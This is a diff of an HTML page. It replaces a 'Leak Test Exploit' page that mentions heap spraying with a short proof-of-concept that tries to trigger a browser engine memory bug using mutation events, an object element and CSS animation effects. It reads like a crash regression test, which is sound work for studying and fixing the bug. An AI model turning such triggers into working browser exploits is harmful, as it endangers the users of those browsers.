@@ -1,12 +1,40 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Leak Test Exploit</title>
+  <style>
+    @keyframes keyframes {}
+    cite { animation: keyframes 100ms }
+  </style>
 </head>
-<body>
-  <h1>Leak Test Exploit: Proxy + super + Spray</h1>
-  <pre id="log"></pre>
-  <script type="module" src="Leak_test_exploit.js"></script>
+<body onload="main()">
+  <object type="image/png">
+    <cite></cite>
+    <dl hidden></dl>
+  </object>
+  <script>
+    const object = document.querySelector("object");
+    const cite = document.querySelector("cite");
+    const dl = document.querySelector("dl");
+
+    function main() {
+      object.addEventListener("DOMSubtreeModified", subtreeModified);
+      object.data = "x";
+      cite.style.animationIterationCount = "infinite";
+    }
+
+    function subtreeModified() {
+      try {
+        const animation = cite.getAnimations()[0];
+        object.width = "1em";
+        object.codeBase; // force internal access
+        animation.effect = new KeyframeEffect(dl, {});
+        document.body.append("Exploit triggered without crash.");
+      } catch (e) {
+        document.body.append("Exception: " + e.message);
+      }
+    }
+  </script>
+  <p>PASS if this test doesn't crash</p>
 </body>
 </html>
